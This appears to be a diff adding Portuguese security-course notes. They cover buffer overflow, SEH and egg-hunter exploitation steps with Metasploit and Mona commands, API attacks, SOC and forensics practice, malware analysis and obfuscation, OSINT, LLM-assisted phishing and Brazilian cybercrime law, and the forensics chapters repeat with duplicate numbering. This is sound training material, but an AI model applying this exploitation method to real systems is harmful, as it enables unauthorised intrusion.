+Ocorre quando dados inseridos em um buffer excedem seu tamanho designado, sobrescrevendo áreas adjacentes de memória — podendo permitir injeção e execução de código arbitrário, elevação de privilégios e comprometimento do sistema.
+
+### Fluxo metodológico clássico
+1. **Fuzzing**: enviar cargas crescentes de dados até a aplicação quebrar, identificando o ponto de falha.
+2. **Cálculo do offset**: gerar uma cadeia de caracteres não repetitiva (`msf-pattern_create -l N`) e, após o crash, usar o valor do EIP para localizar a posição exata via `msf-pattern_offset -q <valor_EIP> -l N`.
+3. **Controle do EIP**: confirmar que o offset calculado realmente controla o EIP, enviando um valor identificável (ex: `"BBBB"`) nessa posição.
+4. **Identificação de badchars**: caracteres hexadecimais (comumente `\x00`) que quebram a aplicação e devem ser removidos do shellcode — identificados com ferramentas como o **Mona** (`!mona bytearray`, `!mona compare`).
+5. **Redirecionamento do fluxo**: localizar uma instrução **JMP ESP** em um módulo sem proteção (ex: via `!mona find`), convertendo o endereço para little-endian, e posicioná-lo exatamente no offset do EIP.
+6. **Geração do shellcode**: criado com `msfvenom`, livre de badchars, posicionado após o endereço de EIP — frequentemente precedido por um bloco de **NOPs** para alinhamento.
+
+Estrutura típica do payload: `buffer_de_preenchimento + endereço_EIP (JMP ESP) + NOPs + shellcode`.
+
+## 7.3 SEH Based Exploitation
+
+**SEH (Structured Exception Handler)** é a estrutura nativa do Windows para tratamento de exceções — acionada quando a aplicação não trata um erro internamente (ex: pop-up de erro padrão do Windows).
+
+Estratégia: sobrescrever a cadeia SEH para redirecionar a execução para código arbitrário, útil quando o espaço disponível para o payload é limitado demais para as técnicas tradicionais de EIP.
+
+- O offset até o registro **SEH** também é calculado via `msf-pattern_offset`.
+- É necessário localizar uma instrução **POP/POP/RET** (sequência que leva o shellcode ao topo da pilha).
+- Estrutura: **nSEH** (ponteiro, tipicamente um salto curto `JMP SHORT`) + **SEH** (endereço POP/POP/RET).
+- `msf-nasm_shell` converte instruções Assembly escritas à mão em opcode (ex: `jmp short 08` → `EB06`).
+
+## 7.4 Egg Hunter
+
+Técnica usada quando não há espaço contíguo suficiente para o shellcode completo. A ideia: colocar o shellcode em **qualquer** espaço de memória disponível (precedido por uma "egg" — uma marca identificável, ex: `W00TW00T`), e um pequeno código "Egg Hunter" varre a memória em tempo de execução até localizar essa marca e desviar a execução para lá.
+
+Gerado com: `msf-egghunter -f python -e <marca> -v egghunter`.
+
+## 7.5 Catálogo de Scripts de Referência (teoria, sem reprodução de código funcional)
+
+Os pontos abaixo documentam, **em nível conceitual**, a progressão metodológica observada em um conjunto de 14 scripts de exploração de um serviço de rede vulnerável usado em laboratório (técnica clássica de Buffer Overflow/SEH, alvo de treinamento TCP na porta 9999). Por política, o código-fonte com shellcode e exploits funcionais completos não é reproduzido aqui — apenas o papel de cada etapa na metodologia:
+
+| Etapa | Papel conceitual |
+|---|---|
+| Conexão inicial | Estabelece socket TCP e recebe o banner da aplicação alvo, validando acesso |
+| Fuzzing incremental | Envia cargas crescentes (ex.: múltiplos de 100 bytes) a um comando específico até a aplicação travar |
+| Cálculo de offset com cadeia única | Envia uma cadeia de caracteres não repetitiva para, a partir do valor capturado no EIP após o crash, calcular a distância exata até o registrador |
+| Confirmação do controle do EIP | Envia um valor identificável na posição calculada para confirmar que o EIP foi sobrescrito corretamente |
+| Construção do payload com JMP ESP | Monta buffer + endereço de redirecionamento (little-endian) + placeholder de shellcode |
+| Shell reverso completo | Integra shellcode funcional (gerado via msfvenom) para abrir conexão reversa ao atacante |
+| Variante com Egg Hunter | Usa uma marca (egg) + mini-rotina caçadora para localizar o shellcode em memória quando o espaço contíguo é insuficiente |
+| Sequência SEH (5 scripts incrementais) | Demonstra, passo a passo, a progressão de um crash simples até a cadeia SEH completa: (1) identificar offset do SEH; (2) confirmar controle do registrador SEH; (3) isolar o ponteiro nSEH; (4) inserir a instrução de salto real (JMP SHORT) no nSEH; (5) redirecionar via salto reverso (JMPBACK) até o shellcode posicionado antes do buffer de preenchimento |
+| Fuzzer dedicado a Egg Hunter | Script de fuzzing isolado, incrementando o buffer até a aplicação travar, como etapa preparatória da técnica |
+
+Essa progressão ilustra como a exploração binária é construída **incrementalmente e de forma testável** — cada script valida uma hipótese (offset, controle de registrador, ausência de badchars) antes de avançar para a etapa seguinte, prática recomendada para qualquer desenvolvimento de exploit em ambiente controlado de laboratório.
+
+
+---
+
+# Segurança de APIs
+
+*Nível: Intermediário a Avançado.*
+
+## 8.1 API Basics
+
+Conceitos fundamentais antes de atacar uma API:
+- **Endpoints**: pontos de acesso de uma API.
+- **Protocolo HTTP**: métodos (GET, POST, PUT, DELETE, PATCH), versões (1.0, 1.1, 2, 3), códigos de status (2xx sucesso, 3xx redirecionamento, 4xx erro do cliente, 5xx erro do servidor).
+- **Autenticação HTTP**: Basic (usuário:senha em Base64, fraco), Digest (hash em vez de texto puro), Bearer Token (token no cabeçalho `Authorization`).
+- **JWT (JSON Web Token)**: formato de token composto por header.payload.signature, usado extensivamente em APIs modernas — ver seção 4.2 sobre manipulação de JWT.
+- **Cookies**: também usados em algumas APIs para manter estado.
+
+### Arquiteturas e protocolos de integração
+- **WebSockets**: comunicação bidirecional persistente.
+- **GraphQL**: linguagem de consulta flexível — permite ao cliente pedir exatamente os campos desejados, mas pode expor introspection schemas revelando toda a estrutura de dados se mal configurado.
+
+### Encodings
+Unicode, Base64, URL Encoding, HTML Encoding — fundamentais para entender como payloads podem ser disfarçados ou revelados em requisições de API.
+
+### API Gateway e Documentação
+API Gateways centralizam autenticação, rate limiting e roteamento. Documentação frequentemente exposta via **Swagger/OpenAPI** — um recurso valioso de reconhecimento, pois mapeia todos os endpoints e parâmetros esperados.
+
+## 8.2 OWASP API Security Top 10
+Ver seção 4.13 para o resumo das 5 principais categorias (BOLA, BUA, Excessive Data Exposure, Lack of Rate Limiting, Broken Function Level Authorization).
+
+## 8.3 Pentest API Tools
+
+- **[OWASP Amass](https://github.com/owasp-amass/amass)**: mapeamento de superfície de ataque e descoberta de assets.
+- **[jwt_tool](https://github.com/ticarpi/jwt_tool)**: análise e manipulação de tokens JWT (testar algoritmos fracos, assinatura `none`, chaves fracas).
+- **[OWASP ZAP](https://www.zaproxy.org)**: proxy de interceptação similar ao Burp Suite, com módulos específicos para APIs.
+- **[Postman](https://www.postman.com)**: cliente para testar e documentar requisições de API manualmente.
+
+## 8.4 Exploiting APIs
+
+Vetores comuns: **SQL Injection** em parâmetros de API; **Mass Assignment** (quando a API aceita e processa campos extras não previstos no formulário, como `"isAdmin": true`, permitindo escalonar privilégio); falhas de autenticação específicas de API (tokens não expirando, ausência de validação de escopo).
+
+---
+
+# Blue Team / Defesa
+
+*Módulo complementar — entender a defesa fortalece a ofensiva (e vice-versa, espírito Purple Team).*
+
+## 9.1 SOC (Security Operation Center)
+
+Funções centrais do SOC: detectar vulnerabilidades, detectar atividades não autorizadas, detectar violações de política, detectar intrusões.
+
+### Níveis de Analista
+- **Nível 1**: triagem inicial de alertas, primeira resposta.
+- **Nível 2**: investigação aprofundada, correlação de dados de múltiplas fontes.
+- **Nível 3**: busca proativa de ameaças (threat hunting), apoio à resposta a incidentes em casos críticos.
+- **Engenheiro de Segurança**: implanta e configura soluções.
+- **Engenheiro de Detecção**: cria regras de detecção.
+- **Gerente de SOC**: gerencia processos e reporta ao CISO.
+
+### Fase de Triagem — 5 W's
+**What** (o quê), **When** (quando), **Where** (onde), **Who** (quem), **Why** (por quê) — estrutura usada para documentar qualquer alerta investigado.
+
+## 9.2 SIEM (Security Information and Event Management)
+
+Coleta dados de múltiplos endpoints/dispositivos em local centralizado, realizando correlação. Fontes de log:
+- **Centradas no host**: logs de eventos do Windows, Sysmon, Osquery (acesso a arquivo, autenticação, execução de processo, PowerShell).
+- **Centradas na rede**: SSH, VPN, HTTP(S), FTP (conexões, compartilhamento de arquivos).
+
+Recursos: ingestão em tempo real, alertas, monitoramento 24x7, investigação retroativa de incidentes.
+
+## 9.3 Firewall
+
+| Tipo | Camada OSI | Características |
+|---|---|---|
+| Stateless | 3-4 | Filtragem básica por regra, sem rastrear conexões — eficiente, mas simples |
+| Stateful | 3-4 | Rastreia conexões em tabela de estados — mais seguro |
+| Proxy/Gateway | 7 | Inspeciona conteúdo do pacote, mascara IP interno, filtragem de conteúdo |
+| NGFW (Next-Gen) | 3-7 | IPS integrado, análise heurística, inspeção SSL/TLS |
+
+Componentes de uma regra: origem, destino, porta, protocolo, ação (permitir/negar/encaminhar), direção (entrada/saída/encaminhamento).
+
+## 9.4 IDS/IPS
+
+- **IDS** (detecção): monitora e alerta, não bloqueia — "câmeras de vigilância".
+- **IPS** (prevenção): pode bloquear/negar tráfego ativamente.
+
+Modos de implantação: **HIDS** (host) e **NIDS** (rede). Modos de detecção: baseado em assinatura, baseado em anomalia, híbrido.
+
+**Snort**: IDS open-source com 3 modos:
+1. **Packet Sniffer** — exibe pacotes em tempo real.
+2. **Packet Logging** — registra pacotes em disco e gera alertas.
+3. **NIDS** — modo principal; aplica regras contra assinaturas conhecidas.
+
+Componentes de regra: ação, protocolo, IPs/portas de origem/destino; metadados: msg (mensagem), sid (ID único), rev (nº de revisão).
+
+## 9.5 Fundamentos de Logs
+
+Tipos: Sistema, Segurança, Aplicativo, Auditoria, Rede, Acesso.
+
+IDs de evento do Windows mais relevantes (verificáveis no **Visualizador de Eventos** — `eventvwr.msc`):
+| ID | Significado |
+|---|---|
+| 4624 | Login bem-sucedido |
+| 4625 | Falha de login |
+| 4634 | Logout |
+| 4720 | Conta criada |
+| 4722 | Conta habilitada |
+| 4724 | Tentativa de redefinição de senha |
+| 4725 | Conta desabilitada |
+| 4726 | Conta excluída |
+
+## 9.6 Gestão de Vulnerabilidades (visão defensiva)
+
+Ver seção 3.9-3.10 para CVE/CVSS/scanners — do ponto de vista defensivo, a gestão envolve priorizar remediação conforme CVSS + contexto de risco do ativo.
+
+## 9.7 Resposta a Incidentes (detalhamento)
+
+**Incidente**: alerta confirmado como atividade maliciosa (verdadeiro positivo), diferente de falso positivo.
+
+Tipos de incidente:
+- Infecção por malware
+- Violação de segurança
+- Vazamento de dados
+- Ataque interno (funcionário mal-intencionado)
+- Ataque de negação de serviço (DoS)
+
+Documentos formais:
+- **Plano de Resposta a Incidentes** (funções, metodologia, plano de comunicação, caminho de escalada).
+- **Playbooks** (instruções passo a passo por tipo de incidente).
+- **Runbooks** (execução técnica detalhada).
+
+## 9.8 Caso Prático de Detecção — CVE-2025-68613 (n8n)
+
+Exemplo real de vulnerabilidade de injeção de expressão em uma plataforma de automação (n8n), permitindo RCE autenticado via `{{ }}` avaliado como JavaScript sem sandboxing adequado, alcançando `child_process` do Node.js.
+
+Lição de Purple Team: a detecção eficaz combina log do proxy (conteúdo do corpo da requisição) + regras **Sigma** direcionadas a padrões de escalada de contexto (não apenas assinaturas específicas de payload) + correlação com criação de processo suspeito pós-exploração — reforçando que compreender a cadeia de exploração ajuda tanto o time ofensivo (testar vulnerabilidades similares) quanto o defensivo (estratégias de detecção mais robustas).
+
+
+---
+
+# Forense Digital e Análise de Malware
+
+*Nível: Avançado.*
+
+## 10.1 Fundamentos de Forense Digital
+
+A forense digital investiga incidentes depois que ocorreram — coleta e preserva evidências digitais para investigação e, quando cabível, uso judicial.
+
+### Análise de Metadados
+Metadados são dados sobre dados:
+- **[ExifTool](https://exiftool.org)**: extrai metadados de imagens, PDFs e outros arquivos.
+- **[pdfinfo](https://poppler.freedesktop.org)**: informações básicas de um PDF (páginas, criador, versão).
+
+### Cadeia de Custódia
+Toda evidência coletada deve ter sua integridade verificada e documentada — prática obrigatória em forense.
+
+### Ferramentas de Imagem Forense
+- **[FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager)**: captura imagem forense de discos/memória, preservando integridade via hash (MD5/SHA).
+- **[Autopsy](https://www.autopsy.com)**: plataforma de análise forense open-source (browser de evidências, recuperação de arquivos, timeline).
+- **[Volatility](https://github.com/volatilityfoundation/volatility3)**: análise de imagens de memória RAM (processos ocultos, conexões de rede, artefatos na memória).
+- **[DumpIT](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows)**: captura de memória em sistemas Windows.
+
+## 10.2 Análise de Malware — Fundamentos
+
+### Ambiente seguro
+O ambiente de análise deve ser **isolado** — máquina virtual sem snapshots de produção, sem acesso à rede real (ou com rede monitorada/simulada), pois malware moderno verifica se está em VM e pode se comportar diferente.
+
+**Sistemas de numeração**: malware trabalha em binário/hexadecimal. A tabela ASCII define como bytes se traduzem em caracteres legíveis.
+
+**Identificação de arquivos**: `file` (identifica tipo real pelo conteúdo), `hexdump -C` (view dos bytes), `stat` (metadados do arquivo no SO). Cada tipo de arquivo tem um **magic number** — sequência de bytes iniciais que o identifica independentemente da extensão (referências: [Gary Kessler's File Signatures Table](https://www.garykessler.net/library/file_sigs.html), [Wikipedia — List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)).
+
+### Tipos de análise
+- **Estática básica**: não executa o código — lê strings, magic numbers, hash, importações.
+- **Estática avançada**: desmontagem e decompilação.
+- **Dinâmica básica**: executa o malware e observa comportamento (processos, rede, arquivo).
+- **Dinâmica avançada**: executa sob debugger, ponto de interrupção por instrução.
+
+## 10.3 Análise Estática
+
+### Hashes e fingerprint
+```
+md5sum arquivo.exe
+sha256sum arquivo.exe
+```
+- **Imphash** (Import Hash): hash das bibliotecas importadas por um PE — agrupa amostras da mesma família.
+- Busca de hash no **[VirusTotal](https://www.virustotal.com)** confirma se amostra já é conhecida.
+
+### Ferramentas
+- **[PEiD](https://github.com/wolfram77web/app-peid)**: identifica packer/compilador/criptografia em PEs.
+- **[PEStudio](https://www.winitor.com)**: análise estática completa de PE (strings, imports, exports, entropy).
+- **[Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)**: extrai strings de texto de um binário (URLs, IPs, comandos, nomes de arquivo revelam comportamento antes de executar).
+
+### Análise de estrutura PE
+Executáveis Windows seguem o formato **PE (Portable Executable)** — inclui header com metadados e seções (`.text` código, `.data` dados, `.rdata` strings/constantes, `.idata` imports).
+
+### Assembly básico para análise
+- **Stack (pilha)**: registrador ESP aponta para o topo; registrador EBP aponta para a base do frame atual.
+- **Prólogo de função**: `PUSH EBP; MOV EBP, ESP; SUB ESP, espaço` — cria um frame de pilha para variáveis locais.
+- Instrução `CALL` salva endereço de retorno, `RET` volta para ele.
+
+## 10.4 Análise Dinâmica
+
+### Ambientes de sandbox
+- **[Any.Run](https://any.run)**: sandbox interativo — permite interagir com a amostra e observar comportamento em tempo real.
+- **[Hybrid Analysis](https://www.hybrid-analysis.com)**: sandbox gratuito com relatório completo.
+- **[Joe Sandbox](https://www.joesandbox.com)**: sandbox comercial com análise mais profunda.
+
+### Ferramentas locais de monitoramento
+- **[Process Hacker](https://processhacker.sourceforge.io)**: visualiza processos, threads, memória, DLLs carregadas, handles abertos — essencial para identificar injeção de processo.
+- **[REMnux](https://remnux.org)**: distribuição Linux especializada em análise de malware — inclui dezenas de ferramentas pré-configuradas.
+- **[FlareVM](https://github.com/mandiant/flare-vm)**: distribuição Windows da Mandiant para análise de malware em ambiente Windows — complementar ao REMnux.
+- **x64dbg** / **OllyDbg**: debuggers para análise dinâmica avançada com breakpoints por instrução.
+- **Wireshark** + **tcpdump**: captura de tráfego de rede gerado pelo malware.
+
+### Filtros Wireshark úteis em análise de malware
+```
+http.request                            # requisições HTTP feitas pelo malware
+http.request.method == "POST"           # possível exfiltração de dados
+dns.qry.name contains "dominio"         # C2 via DNS
+tcp.flags.syn == 1 && tcp.flags.ack == 0  # tentativas de conexão de saída
+```
+
+## 10.5 Técnicas de Proteção e Ofuscação de Malware
+
+Malware usa técnicas para dificultar análise e escapar de antivírus:
+
+### Proteções
+- **Polimorfismo**: o código muda a cada geração (diferente assinatura), mas a função permanece a mesma.
+- **Metamorfismo**: código reescrito completamente a cada propagação — mais difícil de detectar.
+- **Anti-VM**: detecta hypervisors (CPUID, artefatos de VMware/VBox como arquivos, processos, chaves de registro) e muda comportamento.
+- **Anti-debugging**: verifica se está sendo debugado (`IsDebuggerPresent`, timing de instruções) e altera execução.
+- **Packers**: comprimem/criptografam o binário, descomprimindo em memória na execução — UPX é o mais comum.
+
+### Ofuscação de código
+- **XOR**: operação bitwise simples de reversão — `chave XOR dado = cifrado; cifrado XOR chave = dado`. Muito usado para ofuscar strings, shellcode e payloads.
+- **Dobramento de constantes** (constant folding): substituir expressões computáveis em tempo de compilação por seus resultados — torna análise estática menos legível.
+- **Código morto** (dead code): instruções inseridas que nunca são alcançadas — aumenta volume e confunde análise.
+- **Ofuscação de fluxo de controle**: inserção de saltos desnecessários, loops que não executam, troca de condicionais equivalentes — gera código mais longo sem mudança de comportamento.
+
+## 10.6 Ferramentas de Engenharia Reversa
+
+- **[CAPA](https://github.com/mandiant/capa)**: analisa arquivos executáveis e mapeia automaticamente as capacidades identificadas (ex: "acessa o registro", "cria mutex", "conecta à rede") — excelente ponto de partida para malware desconhecido.
+- **[Ghidra](https://ghidra-sre.org)** (NSA): decompilador e desmontador open-source para engenharia reversa.
+- **[IDA Pro](https://hex-rays.com/ida-pro)**: ferramenta comercial de referência para análise de binários.
+- **[pefile](https://github.com/erocarrera/pefile)** (Python): biblioteca para parsing programático de arquivos PE.
+
+
+---
+
+
+
+*Nível: Avançado.*
+
+## 10.1 Forense Digital — Fundamentos
+
+**Artefatos digitais**: evidências presentes em dispositivos de hardware, sistemas operacionais, logs, aplicativos ou redes — detectados por IDS, firewalls, serviços de segurança em nuvem, EDRs, ou relatados por usuários.
+
+### Fase de Triagem Forense
+Antes de coletar evidências formalmente, a triagem determina o escopo e a relevância do incidente. Uma boa triagem evita coleta desnecessária e preserva a cadeia de custódia.
+
+### Ferramentas de Aquisição
+- **[FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager)**: cria imagem forense de discos/memória, preserva hash para integridade (MD5/SHA1/SHA256) — padrão ouro de aquisição de evidências.
+- **[DumpIT](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows)**: ferramenta simples de captura de memória RAM (Windows).
+- **[Autopsy](https://www.autopsy.com)**: análise de imagens forenses — recupera arquivos deletados, analisa histórico de navegador, artefatos do sistema de arquivos.
+- **[Volatility](https://github.com/volatilityfoundation/volatility3)**: análise de dumps de memória RAM — identifica processos, conexões de rede, módulos carregados, possível código injetado.
+
+### Análise estática de arquivos
+```
+file arq               # identifica tipo pelo magic number (não pela extensão)
+hexdump -C arq | head  # visualiza bytes iniciais (magic number)
+stat arq               # metadados (timestamps MAC — Modified, Accessed, Changed)
+pdfinfo arq.pdf        # metadados de PDF
+exiftool arq           # metadados de imagem/arquivo (autor, GPS, câmera, etc.)
+strings arq | grep ...  # extrai strings legíveis de binário
+```
+
+**Magic Numbers** — exemplos:
+| Tipo | Bytes iniciais (hex) |
+|---|---|
+| PNG | `89 50 4E 47 0D 0A 1A 0A` |
+| JPEG | `FF D8 FF` |
+| PDF | `25 50 44 46` (`%PDF`) |
+| ZIP | `50 4B 03 04` (`PK`) |
+| ELF (Linux) | `7F 45 4C 46` |
+| MZ/PE (Windows) | `4D 5A` |
+
+## 10.2 Fundamentos de Malware
+
+**Malware** = qualquer software que executa ações prejudiciais no sistema. Classificações por comportamento:
+- **Vírus**: se replica inserindo código em arquivos legítimos.
+- **Worm**: se replica pela rede sem arquivo hospedeiro.
+- **Trojan**: aparenta ser legítimo, executa ação maliciosa oculta.
+- **Ransomware**: criptografa arquivos e exige pagamento.
+- **Spyware**: coleta informações sem consentimento.
+- **Adware**: exibe publicidade indesejada, frequentemente com spyware embutido.
+- **Botnet**: malware que conecta o host a uma rede de bots controlada por C2.
+- **Rootkit**: oculta presença de malware, frequentemente opera no kernel.
+
+Por distribuição: **Fileless** (sem arquivo em disco, reside em memória — vive em PowerShell, WMI, registro), **Dropper** (baixa e instala outros malwares), **Downloader** (similar, mas com funcionalidade mínima própria).
+
+## 10.3 Análise Estática
+
+Técnica que examina o código/estrutura do malware sem executá-lo.
+
+**Análise de hash/imphash**: `md5sum`, `sha256sum`, `imphash` (hash das funções importadas) — permite verificar no VirusTotal sem expor o arquivo.
+
+**Ferramentas de análise estática:**
+- **PEiD**: identifica packer e compilador do PE (Portable Executable).
+- **PEStudio**: análise completa de PE — imports/exports, strings, entropy, indicadores de suspeita.
+- **CAPA**: ferramenta da Mandiant que mapeia capabilities de um binário para o framework MITRE ATT&CK automaticamente.
+- **[CFF Explorer](https://ntcore.com/explorer-suite)**, **[PE-bear](https://github.com/hasherezade/pe-bear)**: análise e edição de cabeçalho PE.
+
+**Análise de estrutura PE**: cabeçalho DOS (magic `MZ`), cabeçalho PE, seções (`.text` = código, `.data` = dados, `.rsrc` = recursos). Importações revelam quais funções de DLL o malware usa — ex.: `CreateRemoteThread` + `VirtualAllocEx` indicam injeção de processo.
+
+**Strings**: `strings` ou análise no PEStudio — IPs, URLs, registry keys, comandos de sistema frequentemente embutidos no malware.
+
+## 10.4 Análise Dinâmica
+
+Executar o malware em ambiente controlado (sandbox) e observar seu comportamento. **Isolamento é obrigatório** — a VM não deve ter acesso à rede real.
+
+### Sandboxes online
+- **Any.Run** (interativo, permite execução em tempo real).
+- **Hybrid Analysis** (Falcon Sandbox, relatório detalhado gratuito).
+- **Joe Sandbox** (profundo, multiplataforma).
+
+### Ferramentas locais de análise dinâmica
+- **Process Hacker** (monitoramento de processos em tempo real, detecta injeção, alocação de memória, handles abertos, DLLs carregadas).
+- **[REMnux](https://remnux.org)**: distribuição Linux para análise de malware, pré-configurada com dezenas de ferramentas.
+- **[FlareVM](https://github.com/mandiant/flare-vm)**: distribuição Windows da Mandiant com 170+ ferramentas de RE e análise.
+- **[x64dbg](https://x64dbg.com)** / **[WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger)**: debugger de nível de instrução Assembly para análise dinâmica profunda.
+- **[Wireshark](https://www.wireshark.org)** / **[tcpdump](https://www.tcpdump.org)**: captura de tráfego de rede gerado pelo malware.
+- **[FakeNet-NG](https://github.com/mandiant/flare-fakenet-ng)**: simula serviços de rede para capturar respostas do malware a requisições DNS/HTTP.
+
+### Fluxo de análise dinâmica
+1. Tirar snapshot da VM limpa.
+2. Configurar monitoramento (Process Hacker, Wireshark, FakeNet, Process Monitor).
+3. Executar o malware.
+4. Observar: processos criados/terminados, modificações de registro, criação/modificação de arquivos, conexões de rede, injeção de código.
+5. Restaurar snapshot após a análise.
+
+## 10.5 Análise Avançada — Engenharia Reversa
+
+Técnica de desconstrução de um artefato para entender seu design e funcionamento internos.
+
+**Ferramentas de engenharia reversa:**
+- **[Ghidra](https://ghidra-sre.org)** (NSA, open-source): disassembler + decompilador.
+- **[IDA Pro](https://hex-rays.com/ida-pro)**: ferramenta comercial padrão da indústria.
+- **[Cutter](https://cutter.re)** (baseado em Radare2): open-source, interface gráfica.
+
+**Registradores na análise de função (x86):**
+- **ESP**: Stack Pointer — aponta para o topo da pilha.
+- **EBP**: Base Pointer — âncora da pilha para uma função específica; parâmetros da função ficam acima de EBP, variáveis locais ficam abaixo.
+
+Na entrada de uma função: `PUSH EBP; MOV EBP, ESP` (prólogo). Na saída: `MOV ESP, EBP; POP EBP; RET` (epílogo).
+
+## 10.6 Ofuscação de Malware
+
+Técnicas para dificultar análise e detecção (evasão de AV e sandboxes):
+
+### Técnicas de proteção do código
+- **Polimorfismo**: malware muda sua assinatura a cada infecção, mas o núcleo funcional é o mesmo — primeiras variantes eram simples permutações de bytes e instruções equivalentes.
+- **Metamorfismo**: reescreve o próprio código a cada infecção, sem núcleo fixo — mais complexo que polimorfismo.
+- **Packers**: comprimem o executável, descomprimindo em memória em tempo de execução — a assinatura em disco difere completamente do código funcional.
+- **Anti-VM**: detecta ambiente virtualizado (checagem de MAC address de fabricante conhecido de hypervisor, presença de arquivos específicos de VM, tempo de execução de instruções privilegiadas) e altera comportamento ou encerra.
+- **Anti-Debugging**: detecta presença de debugger via `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, análise de timing.
+
+### Ofuscação de dados
+- **XOR**: cifragem reversível com chave conhecida pelo malware — strings e payloads ocultos em disco, deofuscados em runtime.
+- **Dobramento constante**: resultado de expressões é pré-calculado em tempo de compilação, ofuscando literais.
+- **Código morto**: inserção de código que nunca é executado para confundir análise estática.
+
+### Ofuscação de fluxo de controle
+- Inserção de saltos/ramificações desnecessários que encobrem o fluxo real de execução.
+
+### CAPA — mapeamento de capabilities
+**CAPA** (Mandiant) analisa o binário e retorna as capabilities detectadas mapeadas para MITRE ATT&CK, facilitando a classificação do malware sem análise manual completa.
+
+### REMnux / FlareVM
+Distribuições especializadas que eliminam o overhead de configuração de ambiente de análise, garantindo reprodutibilidade e segurança do analista.
+
+
+---
+
+# Inteligência (OSINT / Cyber Intel)
+
+*Nível: Intermediário a Avançado.*
+
+## 11.1 Contrainteligência e CTI
+
+**Contrainteligência**: produção de conhecimento e execução de atividades para neutralizar ações de inteligência adversária. No contexto corporativo, envolve detectar, analisar e mitigar tentativas de coleta de informações sobre a organização.
+
+**Cyber Threat Intelligence (CTI)**: inteligência de ameaças cibernéticas — produção de conhecimento acionável sobre atores, táticas e ferramentas de ataque para embasar decisões de defesa.
+
+Órgãos relevantes (Brasil): **ABIN** (Agência Brasileira de Inteligência), setores de inteligência das Forças Armadas e Polícia Federal.
+
+### Framework NIST CSF (Cybersecurity Framework)
+Cinco funções que estruturam a gestão de segurança cibernética:
+1. **Identify** (Identificar): inventário de assets, processos críticos, riscos.
+2. **Protect** (Proteger): controles de acesso, treinamento, tecnologias de proteção.
+3. **Detect** (Detectar): monitoramento contínuo, processos de detecção de anomalias.
+4. **Respond** (Responder): planos de resposta a incidentes, comunicação, mitigação.
+5. **Recover** (Recuperar): restauração de capacidades, melhorias pós-incidente.
+
+## 11.2 Ferramentas Avançadas de OSINT
+
+- **[Shodan](https://www.shodan.io)** (ver seção 3.2): filtros avançados — `vuln:CVE-XXXX-YYYY` (hosts afetados por CVE específica), `product:`, `os:`, `city:`, `ssl.cert.subject.cn:`.
+- **[Maltego](https://www.maltego.com)**: plataforma de correlação visual — mapeia relações entre pessoas, empresas, domínios, IPs, endereços físicos, redes sociais.
+- **[Recon-ng](https://github.com/lanmaster53/recon-ng)**: framework de reconhecimento web modular (Python), com banco de dados integrado, similar ao Metasploit em conceito.
+- **[TheHarvester](https://github.com/laramies/theHarvester)**: coleta e-mails, subdomínios, hosts, nomes de funcionários, portas abertas e banners de múltiplas fontes (Google, Bing, LinkedIn, Shodan, Hunter.io etc.).
+- **[Spiderfoot](https://www.spiderfoot.net)**: automatiza OSINT de forma abrangente (IP, domínio, e-mail, pessoa) com interface web.
+
+---
+
+# IA Aplicada à Segurança Ofensiva
+
+*Nível: Avançado. Conteúdo de fronteira — combinação de ML com segurança ofensiva/defensiva.*
+
+## 12.1 IA na Segurança Ofensiva e Defensiva
+
+A IA surge como ferramenta de apoio a ambos os lados da fronteira cibernética: automatizar reconhecimento, gerar payloads de engenharia social, e ao mesmo tempo detectar ameaças em escala que humanos não conseguiriam.
+
+**Ataques de engenharia social potencializados por IA:**
+- **Phishing com ChatGPT**: LLMs permitem criar e-mails de phishing altamente personalizados e gramaticalmente perfeitos em qualquer idioma, reduzindo drasticamente o esforço manual e tornando campanhas em escala mais convincentes.
+
+**Quebra de CAPTCHA com IA/OCR:**
+- CAPTCHAs baseados em imagem são vulneráveis a modelos de visão computacional — OCR combinado com modelos de deep learning consegue resolver CAPTCHAs com alta taxa de acerto, automatizando ataques que antes exigiam interação humana.
+
+## 12.2 Ataques de Envenenamento (Data Poisoning)
+
+**Data Poisoning / Poluição de base de conhecimento**: introdução deliberada de dados maliciosos ou tendenciosos no conjunto de treinamento de um modelo de ML, com o objetivo de:
+- Comprometer a acurácia do modelo.
+- Fazer o modelo aprender comportamentos indesejados (backdoor/Trojan models).
+- Criar vulnerabilidades exploráveis no comportamento do modelo em produção.
+
+Vetor especialmente relevante para modelos de detecção de ameaças que aprendem continuamente com dados do ambiente.
+
+## 12.3 Fundamentos de Machine Learning Aplicados à Segurança
+
+Algoritmos e paradigmas relevantes no contexto de segurança:
+
+| Algoritmo | Aplicação em Segurança |
+|---|---|
+| Regressão (linear/logística) | Classificação de tráfego benigno/malicioso, detecção de spam |
+| Árvores de Decisão / Random Forest | Classificação de malware por features de PE |
+| K-means (clustering) | Agrupamento de amostras de malware por similaridade de comportamento |
+| Redes Neurais / MLP | Detecção de anomalias em séries temporais de rede |
+| CNN (Convolutional Neural Networks) | Análise visual de malware (bytes convertidos em imagem) |
+| GANs (Generative Adversarial Networks) | Geração de amostras adversariais (evasão de classificadores), síntese de dados de treinamento |
+
+---
+
+# Direito Digital e Aspectos Legais
+
+*Obrigatório para qualquer profissional de pentest/red team no Brasil.*
+
+## 13.1 Introdução ao Direito Digital
+
+O Direito Digital é a aplicação dos princípios jurídicos ao ambiente digital, tratando de relações, conflitos e regulações oriundas do uso de tecnologia, internet e dados. Não se trata de um ramo autônomo, mas de uma especialização transversal que atravessa o direito civil, penal, empresarial e constitucional.
+
+**Por que é essencial para o profissional de segurança ofensiva**: toda atividade de pentest/red team que não possui autorização formal e documentada pode configurar **crime**. Conhecer a lei protege o profissional e embase o escopo do trabalho.
+
+## 13.2 Crimes Digitais — Lei 12.737/2012 (Lei Carolina Dieckmann)
+
+Sancionada após o vazamento de fotos pessoais da atriz Carolina Dieckmann, inseriu no Código Penal os crimes informáticos:
+
+**Art. 154-A** — Invasão de dispositivo informático:
+> "Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e com o fim de obter, adulterar ou destruir dados ou informações sem autorização expressa ou tácita do titular do dispositivo ou instalar vulnerabilidades para obter vantagem ilícita."
+> **Pena**: detenção de 3 meses a 1 ano e multa.
